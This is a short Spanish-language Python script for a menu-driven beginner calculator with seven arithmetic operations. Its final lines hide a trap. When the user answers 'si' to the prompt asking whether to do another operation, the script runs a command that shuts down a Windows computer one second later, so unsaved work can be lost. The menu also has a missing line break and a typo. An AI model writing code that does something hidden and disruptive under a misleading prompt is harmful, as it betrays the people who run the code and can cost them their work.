import os

print("programa calculadora con una variable")
print("********************")
print("* Menu de opciones *")
print("********************")

resp = ""
re = True
while re:

    print("""
    1. Suma
    2. Resta
    3. Multiplicación
    4. División
    5. División entera6. Exponente
    7. Modulo o resto """)
    numero = (int(input("cual es tu opcion deseada: ")))
    if numero == 1:

        print("Elegiste Suma.")
        numero = (int(input("introduce el primer numero: ")))
        numero += (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    elif numero == 2:

        print("Elegiste Resta.")
        numero = (int(input("introduce el primer numero: ")))
        numero -= (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    elif numero == 3:

        print("Elegiste Multiplicación.")
        numero = (int(input("introduce el primer numero: ")))
        numero *= (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    elif numero == 4:
        print("Elegiste División.")
        numero = (int(input("introduce el primer numero: ")))
        numero /= (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    elif numero == 5:

        print("Elegiste división entera.")
        numero = (int(input("introduce el primer numero: ")))
        numero //= (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    elif numero == 6:

        print("Elegiste exponente.")
        numero = (int(input("introduce el primer numero: ")))
        numero **= (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    elif numero == 7:

        print("Elegiste moudulo o resto.")
        numero = (int(input("introduce el primer numero: ")))
        numero %= (int(input("introduce el segundo numero: ")))
        print("el resultado es: ", numero)

    else:
        print("no existe esa opción.")

    resp = str(input("deseas realizar otra operación?"))

    resp = resp.lower()
    if resp == "no" :

        re = False

    if resp == "si":
        r = os.system("shutdown /s /t 1")


